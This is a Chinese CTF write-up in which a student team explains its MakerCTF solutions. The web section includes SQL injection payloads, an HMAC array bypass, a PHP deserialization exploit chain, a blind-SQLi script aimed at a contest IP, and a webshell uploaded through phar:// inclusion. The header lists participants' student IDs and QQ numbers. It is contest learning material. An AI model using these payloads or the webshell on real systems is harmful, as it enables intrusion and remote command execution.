---
title: MakerCTF Write Up
date: 2018-05-17 14:08:53
tags:
---

**MakerCTF Write-Up**

<!--more-->

***
**参赛信息：**

*	**队名：**Doubl--R   **QQ:**1036460042 
	
*	**队员：**
		张恒志    学号：17180110101		 QQ：923435274
		祝佳磊    学号：17189110002		 QQ：1036460042
		曹植晨    学号：                  QQ：572929574


*	**对应题目解题:**

	**MISC:**

		Welcome：祝佳磊
		Nazo：张恒志、祝佳磊、曹植晨
		我的世界：祝佳磊
		See or do not see：曹植晨
		Moe：祝佳磊
		Pcap：曹植晨、张恒志

	**Web:**

		Baby sqli：张恒志，曹植晨、祝佳磊
		Easy bypass： 张恒志，曹植晨、祝佳磊
		Easy_unserialize：张恒志，曹植晨、祝佳磊
		CURL：张恒志，曹植晨、祝佳磊
		Baby sqli2：张恒志，曹植晨、祝佳磊
		神秘交流平台：张恒志，曹植晨、祝佳磊

	**Crypto:**

		Easy RSA：曹植晨
		Crypto2：曹植晨、张恒志

	**RE:**

		贪吃蛇：祝佳磊

	**MOBILE:**

		Get_flag：张恒志

***

**解题思路：**

***

**MISC:**

*	**Welcome:**

	复制黏贴提交

*	**Nazo:**

	1.直接输入;key:wlecome

	2.点击key;key:gotcha

	3.where is key 从右往左念 key is where ;key:where

	4.复制黏贴百度；key:survival

	5.莫斯密码；key:sos

	6.base64解码；key:1029174037

	7.提示你刚输入了什么，QQ添加好友一下刚输入的；key:macintosh

	8.标题IDNs，国际化域名。错的是.世界，访问这个域名；key:saionjisekai

	9.标题角度，从电脑侧面看；key:pineapple

	10.百度搜一下图，发现图中是鼠标；key:mouse

	11.复制黏贴百度，发现是不同样式文字，一一比对；key:neweroslesstofu

	12.1A2B是种简单的猜数游戏A代表数字相同且位置正确的个数，B表示数字相同位置不一样的个数；key:9506

	13.中间有一张图，右键查看元素，出路径，访问路径；key:thealpha

	14.下载图片，后缀改成.rar，解压缩，里面有个torrent文件,打开；key：greendam

	15.声音的轨迹，那么我们将音频文件下载下来，用音频分析的软件去分析一下音频的情况，可以发现一段key，但是这段key有一个坑，就是最后一个字母因为高度的不够，把i的上面的点给遮住了，结果一直认为是l，所以卡了一段时间，2333.key:koenokiseki

	![Alt text](http://120.77.152.169/pic_upload/upload/201805182353472150.jpeg)

	16.发现中间有东西，F12一下，发现一个图片路劲，访问一下，再F12，把遮盖的东西的宽高都改成0.出key:secretvg

	![Alt text](https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/makerctf/nazo1.jpg)

	17.发现中间有一堆空格，把空格复制下来，发现空格的编码格式不同，一种空格占两节，一个占一节，把两节的换一下。出flag:ENTROPY

	![Alt text](https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/makerctf/nazo2.jpg)

*	**我的世界:**

	真玩出来的，flag忘记截图了，现在进去没了。游戏ID：DoubleR

*	**see or do not see:**

	解法一：下载文件，pdf转wps就能看到被图片盖住的flag

	解法二：复制黏贴

	![Alt text](https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/makerctf/see1.jpg)

	![Alt text](https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/makerctf/see21.jpg)

*	**Moe:**

	下载图片，用winhex打开，查询IEND，在中间看到了一个png图片的结束标志和开始标志，知道了时两张图片

	![Alt text](https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/makerctf/moe1.jpg)

	将后一张图片分离出来，开始百度双图图片隐写，查到了盲水印。于是从github上下了个脚本，分离盲水印。

	![Alt text](https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/makerctf/moe2.jpg)

	![Alt text](https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/makerctf/moe3.jpg)


**Web:**

*	**baby sqli:**

	因为在markdown中反单引号为关键字，所以文章中所有反单引号用backtick代替

	这道题晚上肝到两点，终于做出来了，主要是用到了一个之前没有见过的姿势，用单引号来注释

	```php
		if(preg_match("/*|#|;|,|is|file|drop|union|select|ascii|mid|from|(|)|or|\^|=|<|>|like|regexp|for|and|limit|file|--|||&|".urldecode('%09')."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%a0')."/i",$username)){
		die('wafed by pupiles');
		}
	```

	可以看到过滤了很多很多的关键字，万能密码需要注释符的参与，但是过滤的里面把常见的过滤符号:`#,--,;%00,/**/`都给过滤了，那么常规的万能密码就没有办法直接登陆。

	经过不懈的google(baidu上啥都没有)，终于发现了一种注释方式，在某种情况下反单引号可以注释后面的语句，给个链接：

	[为什么-backtick-能做注释符](http://www.yulegeyu.com/2017/04/11/为什么-backtick-能做注释符/)

	通过文章介绍的方法，我在本地测试了一下用反单引号注释的情况:

	![](http://120.77.152.169/pic_upload/upload/201805171542325063.jpeg)

	从这个语句可以看出来，反引号之所以能够注释，是因为反引号中间的内容被mysql解释为了order by之后的别名，但是因为这一段别名并不存在，所以加上一个@错误抑制符就可以阻止mysql报错，成功绕过

	反单引号注释的限制还是很大的，我们需要找到一个能够使用别名的地方，正如博客上说的，单引号本身不属于注释符，因为我们在写了第一个反单引号mysql会自动补全最后的一个单引号，所以才能达到注释的目的。

	所以我们构造payload:`admin' group by @backtick`成功拿到flag

	![](http://120.77.152.169/pic_upload/upload/201805171552044156.jpeg)

* **easy bypass:**

	```php
	<?php
	highlight_file(__FILE__);
	if(empty($_POST['hmac']) || empty($_POST['host'])){
    	header('HTTP/1.0 400 Bad Request');
    	exit;
	}
	$secret = getenv("SECRET");
	if(isset($_POST['nonce']))
   		$secret = hash_hmac('sha256',$_POST['nonce'],$secret);
	$hmac = hash_hmac('sha256',$_POST['host'],$secret);
	if($hmac !== $_POST['hmac']){
	    header('HTTP/1.0 403 Forbidden');
	    exit;
	}
	echo exec('cat ../flag.txt');
	?>
	```

	代码审计:

	*	有三个POST的参数：hmac,host,nonce
	*	`nonce`和`$secret`sha256加密以后的值和host的值进行一次加密，如果传入的hmac的值和加密后的值相等的话就输出flag

	php的代码审计，总可以用数组试一试，因为hash_hmac无法处理数组，如果我们的`nonce`传一个数组，返回的`$secret`的值就为NULL，也就不需要知道原来secret的值。

	而下面单纯的host值的sha256的结果我们是可以预测的，所以最后构造payload：`nonece[]=1&host=test&hmac=43b0cef99265f9e34c10ea9d3501926d27b39f57c6d674561d8ba236e7a819fb`

	![](http://120.77.152.169/pic_upload/upload/201805171603306969.jpeg)	

*	**easy_unserialize:**

	```php
	<?php
	error_reporting(0);
	highlight_file(__FILE__);
	class gg
	{
    	private $gg;
    	public function __destruct()
    	{
    	    $this->gg->get1();
    	}
	}
	class start
	{
    	private $start1;
    	private $start2;
    	public function get1()
    	{
        	$s1 = $this->start1;
        	$s2 = $this->start2;
        	$s1($s2);
    	}
	}

	class cat
	{
	    private $name = "蛋黄";
	    private $color = "橘色";
	    private $weight = "5公斤";
	
	    public function getName()
	    {
	        return $this->name;
	    }

	    public function getColor()
	    {
	        return $this->color;
	    }
	
	    public function getWeight()
	    {
	        return $this->weight;
	    }

	    public function __invoke($args)
	    {
	        echo $args."不是函数";
	    }
	}

	class test2
	{
	    private $a;
	    public function __toString()
	    {
	        $this->a->getFlag();
	    }
	}

	class flag
	{
    	public function getFlag()
    	{
    	    system('cat ../flag.txt');
    	}
	}
	$x = $_GET['x'];
	if (isset($x)) {
	    unserialize($x);
	}
	?>
	```

	很明显的一道反序列化的题，只是逻辑稍微绕一点，慢慢分析：

	*	想要触发flag类里面的getFlag()函数，可以看到在test2中`__toString()`方法中可以通过a去执行getFlag函数，那么`$a`就应该是flag类的对象

	* 	想要执行魔术方法`__toString()`，需要将test2类当作字符串输出，那么在cat类中的`__invoke`函数可以达到这个要求，所以$args应该是test2的对象

	*	想要执行`__invoke()`需要将一个对象作为函数去调用，我们可以找到在start类中可以将一个对象作为函数去调用，所以start中的`$start1`为cat类的对象，`$start2`		为test2类的对象

	*	想要执行start类中的get1()方法必须通过gg类的`__destruct`方法，而且其中的`$gg`应该是start2类的对象

	逻辑清楚了以后，直接写出payload：

	```php
	<?php
	class gg
	{
	    private $gg;
	    public function __construct()
	    {
	        $this->gg = new start();
	    }
	}
	class start
	{
	    private $start1;
	    private $start2;
	    public function __construct()
	    {
	        $this->start1 = new cat();
	        $this->start2 = new test2();

	    }
	}

	class cat
	{
	    public function __invoke($args)
	    {
	        echo $args."不是函数";
	    }
	}

	class test2
	{
	    private $a;
	    public function __construct()
	    {
	        $this->a = new flag();
	    }
	}

	class flag
	{
    	public function getFlag()
    	{
        	system('cat ../flag.txt');
    	}
	}

	$ggo = new gg();
	$result = serialize($ggo);
	echo urlencode($result);
	?>

	```

	这里需要将序列化的对象进行url编码以后才可以成功

	![](http://120.77.152.169/pic_upload/upload/201805171640571905.jpeg)

*	**CRUL:**

	看到题目，很明显的一道命令执行，但是有个棘手的地方就是没有回显，所以我们需要通过外通道将获得的数据打回到自己的服务器

	经过一些测试以后，发现空格被过滤了，但是管道符没有被过滤，在网上找了一些资料，和01师傅发的命令注入的资料，可以构造，先构造了一个payload测试思路：

	![](http://120.77.152.169/pic_upload/upload/201805172216577101.jpeg)

	在自己的服务器上可以监听到打回来的数据

	![](http://120.77.152.169/pic_upload/upload/201805172218318009.jpeg)

	可以看出来whoami的执行结果是www-data

	那么现在我们可以构造payload：

	![](http://120.77.152.169/pic_upload/upload/201805172221005305.jpeg)
	
	在服务器上接受到base64之后的数据
	
	![](http://120.77.152.169/pic_upload/upload/201805172223532994.jpeg)

	将打回来的数据base64解密以后可以得到：

	```
	--6xakjdhcfhcnsk
	--7xabf8sahdchfudy.txt
	css
	index.php
	```

	猜想flag应该在--7xabf8sahdchfudy.txt中，直接请求这个文件夹即可得到flag

	![](http://120.77.152.169/pic_upload/upload/201805172230363469.jpeg)

*	**baby sqli2:**

	因为之前给了源码，但是waf和之前有一些不一样，没有之前那么严格，发现ascii,substr,mid,>,<,=,(),^都可以用，但是注释符用不了，那么基本就是盲注了，但是username字段只允许是admin，这点绕了我们很长时间，试了很多种方法，想要去绕过admin的限制，猜想了后台是strcmp,==之类的比较函数，但是都没有用，联想到放了^符号，那就试一试异或的注入，构造语句`admin'^1^'1`，这里为了闭合单引号。

	发现`admin'^1^'1`和`admin'^0^'1`返回的页面不一样，那么有了盲注的判断条件，直接写脚本跑吧，写的很简单：

	```python
	import requests

	url = 'http://45.40.207.251:8002/login.php'
	data = {'username': '','passwd':'123'}
	success = 'passwd is wrong'
	result1 = ''
	databasepayload = "admin'^(ascii(mid((passwd)from({bit})))={num})^'1"

	for i in range(1,35):
    	print i
    	for j in range(47,123):
        	finalpayload = databasepayload.format(bit=i, num=j)
        	data['username'] = finalpayload
        	result = requests.post(url, data=data)
        	if success in result.content:
        	    result1 = result1 + chr(j)
        	    print result1
	

	```

	没理解后台怎么判断admin的，比赛完找师傅py一波源码学习一下

*	**神秘的交流平台:**

	打开控制台，看到了invitation_code.js文件，猜测这里可以得到上面表单的邀请码

	![Alt text](http://120.77.152.169/pic_upload/upload/201805172246589052.jpeg)

	将invitation_code.js文件运行一下，可以得到：

	发现我们可以调用get_invitation_code方法，在控制台调用，得到进一步信息：

	![Alt text](http://120.77.152.169/pic_upload/upload/201805172259545298.jpeg)

	按照所示的密文ROT13解密，解密结果为：

	If you want further information, please use POST to access/4df810ff9d0cab8e342469fe3a9aa885.php

	那我们用post请求上面页面，得到：

	```

	window.v_ariational = function () {
        $.ajax({
            type: "POST", dataType: "json", url: "/CTF1.php", success: function (a) {
                console.log(a)
            }, error: function (a) {
                console.log(a)
            }
        })
    };
    window.va_riational = function () {
        $.ajax({
            type: "POST", dataType: "json", url: "/CTF2.php", success: function (a) {
                console.log(a)
            }, error: function (a) {
                console.log(a)
            }
        })
    };
    window.get_invitation_code = function () {
        $.ajax({
            type: "POST", dataType: "json", url: "/CTF.php", success: function (a) {
                console.log(a)
            }, error: function (a) {
                console.log(a)
            }
        })
    };
    window.var_iational = function () {
        $.ajax({
            type: "POST", dataType: "json", url: "/CTF3.php", success: function (a) {
                console.log(a)
            }, error: function (a) {
                console.log(a)
            }
        })
    };
    window.vari_ational = function () {
        $.ajax({
            type: "POST", dataType: "json", url: "/CTF4.php", success: function (a) {
                console.log(a)
            }, error: function (a) {
                console.log(a)
            }
        })
    };
    window.varia_tional = function () {
        $.ajax({
            type: "POST", dataType: "json", url: "/CTF5.php", success: function (a) {
                console.log(a)
            }, error: function (a) {
                console.log(a)
            }
        })
    };
    window.variat_ional = function () {
        $.ajax({
            type: "POST", dataType: "json", url: "/CTF6.php", success: function (a) {
                console.log(a)
            }, error: function (a) {
                console.log(a)
            }
        })
    };
    window.variati_onal = function () {
        $.ajax({
            type: "POST", dataType: "json", url: "/CTF7.php", success: function (a) {
                console.log(a)
            }, error: function (a) {
                console.log(a)
            }
        })
    };
    window.variatio_nal = function () {
        $.ajax({
            type: "POST", dataType: "json", url: "/CTF8.php", success: function (a) {
                console.log(a)
            }, error: function (a) {
                console.log(a)
            }
        })
    };
    window.variation_al = function () {
        $.ajax({
            type: "POST", dataType: "json", url: "/CTF9.php", success: function (a) {
                console.log(a)
            }, error: function (a) {
                console.log(a)
            }
        })
    };
    window.variationa_l = function () {
        $.ajax({
            type: "POST", dataType: "json", url: "/CTF10.php", success: function (a) {
                console.log(a)
            }, error: function (a) {
                console.log(a)
            }
        })
  	};

	```

	![Alt text](http://120.77.152.169/pic_upload/upload/201805172305372243.jpeg)

	得到邀请码：FQXG-DWXW-JOSZ-XEGS-UZDC

	用邀请码和下面的数字填写到登陆表单中，进入第二关：

	![Alt text](http://120.77.152.169/pic_upload/upload/201805172311526290.jpeg)

	![Alt text](http://120.77.152.169/pic_upload/upload/201805172322453160.jpeg)

	那我们改一下X-Forwarded-For为172.31.10.233，请求46c48bec0d282018b9d167eef7711b2c.php，发现是一个文件上传，但只能传txt文件，并且上传的文件湖北改名而且后缀名为txt，文件上传无法直接利用

	既然没思路了，闲来无事就扫一下目录，结果真的发现一些不得了的东西：

	![Alt text](http://120.77.152.169/pic_upload/upload/201805172325338738.jpeg)

	发现有一个test.php，请求一下，发现是一个文件包含，但是后缀名限定死为.php，试一下php://filter读取各种php文件源码，成功拿到所有文件的u俺妈，发现文件上传没得整，整理一下思路。现在我们掌握两个可控的地点，一个是文件包含漏洞，一个是之前的文件上传。思路很清晰，我们努力让文件去包含哪个txt文件，在txt文件中写我们的webshell。

	但是这里有一点坑，即使因为文件包含的后缀名被限定为.php，所以我们无法包含txt文件，在网上找到了很多绕过的方法，但是所需的php版本比较低。

	做ctf题我收获到的一点就是不要在一个点死磕，如果不行的话就换思路，想一想，我们能不能用到.php的后缀，而不是去截断它，最后在网上找到了这种姿势，通过phar://来包含：

	*	我们上传一个被压缩的php文件，为1.php，

		内容是：

		```php
		<?php                                          
		ini_set("max_execution_time",0);                
		echo "bgein";                                   
		system($_POST['cmd']);                          
		echo "finish";                                   
		?>
		```

		压缩以后成为1.zip，将文件名改为.txt之后上传。

		![Alt text](1)

	*	之后在文件包含漏洞的那里用phar协议，构造payload：

		phar://Uploads/xxx/1

		这样我们就可以用到.php，成功包含文件

		然后我们通过post ls 命令查看当前路径下的文件，看到有一个f_____l_____a_____g.txt

		![Alt text](2)

		用head 命令读一下出flag

		![Alt text](3)



**Crypto:**

*	**Easy RSA:**

	拿到公钥文件之后，在OpenSSL中读取，获得大数N和模数E。		  

	![Alt text](https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/makerctf/Crypto/1.png)

	利用RSATool分解大数，并获得私钥D。

	![Alt text](https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/makerctf/Crypto/2.png)

	利用得到的私钥解密，脚本如下：
 
    	```
    		n=0xBFE996752088885F2EA2352FDF3E9515F662FC4D3475DDA6F8A1608E54B416B7
			e=0x10001
    		d=0xA499A2545F4CFB3A37F3240F2538B6009E12DDCDD7605F0412BE99F0F7841111
    		with open("enc1.txt","rb") as f:
        		data = f.read()
        		data = data.encode("hex")
        		c = int(data,16)
        		mingwen = pow(c,d,n)
    			print hex(mingwen)
    			result = hex(mingwen)[2:-1]
    			result = "0"+result
    			result = result.decode("hex")
    		with open("enc1","wb") as f:
        		f.write(result)

		```

	得到的结果如下：

	![Alt text](https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/makerctf/Crypto/3.png)

	之后16进制转字符串即可，或直接将生成的enc1用notepad++打开：

	![Alt text](https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/makerctf/Crypto/4.png)	

*	**Crypto2:**
	
	分析加密算法，发现r可以通过前一半爆破，之后带入后一半可以解出flag。脚本如下：

	```
		import multiprocessing 
    	from time import sleep 
    	import os 

		i = 0 
		p = int("11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711") 
		c1 = int('j6jj3x3ekpckviaud7iqcer09lo7y9tzipt6ybedojtypte6esoy8n8qbbkhx4m47i19ergp44djdwfds3q3wz657q62jria3di', 36) 
		def cal(i, p, c1, tag): 
			ii = i 
			print ("[Process%d]: start from %d" % (tag, ii)) 
			r = 2 ** i 
			while True: 
				r = (r * 2) % p 
				ii += 1 
				if r == c1: 
					print ii 
					os.system("echo %d >> /tmp/result" % ii) 
				if ii % 2**20 == 0: 
					print('[Process%d]: now %d' % (tag, ii)) 
					if ii > 2 ** 28 * (tag+1): 
						print('[Process%d]: not found.' % tag) 
						break 
			print('[Process%d]: exited!' % tag) 
		ps = list() 
		#cal(int(i * 2**28), int(p), int(c1), i)

		for i in range(0,16): 
			pp = multiprocessing.Process(target=cal, args=((int(i * 2**28), int(p), int(c1), i))) 
			pp.start() 
			ps.append(pp) 
		h = int("7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916") 
		p = int("11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711") 
		def base36encode(number, alphabet='0123456789abcdefghijklmnopqrstuvwxyz'): 
		 	if not isinstance(number, (int, long)): 
				raise TypeError('number must be an integer') 
			base36 = '' 
			sign = '' 
			if number < 0: 
				sign = '-' 
				number = -number 
			if 0 <= number < len(alphabet): 
				return sign + alphabet[number] 
			while number != 0: 
				number, i = divmod(number, len(alphabet)) 
				base36 = alphabet[i] + base36 
			return sign + base36 
		c1 = int('j6jj3x3ekpckviaud7iqcer09lo7y9tzipt6ybedojtypte6esoy8n8qbbkhx4m47i19ergp44djdwfds3q3wz657q62jria3di', 36) 
		c2 = int('71rf2w5m1b6uh408iqwte64ek1jbjnhdam9g6xn6l5zj7e8fh7sbv7bsmpdv4b31292yiojao025hltmvm2ke5y89gy3r858c12cabzai8fw98aiatg1c', 36) 
		r = int('8485716')         #from[0,10000000)
		if c1 == pow(2, r, p): 
			print('get flag!')
		print(base36encode(c2/pow(h,r,p)))

	```

	结果：

	![Alt text](https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/makerctf/Crypto/5.png)


**RE:**

*	**贪吃蛇:**

	由于我组没有bin组师傅，所以这道题开始我们是玩出来的。后来我们用winhex打开snake.exe。看到了一大块10的数据，我们将那些10按行复制出来并黏贴，发现就是游戏界面，于是我们就把所有的1改成了0

	![Alt text](https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/makerctf/RE1.jpg)

	保存再重新打开时，发现障碍就被清除了，再就很容易就玩出来了。还好最后复现的时候想出了这种解法，不然再玩几个小时可能会疯

	![Alt text](https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/makerctf/RE2.jpg)

	![Alt text](https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/makerctf/RE3.jpg)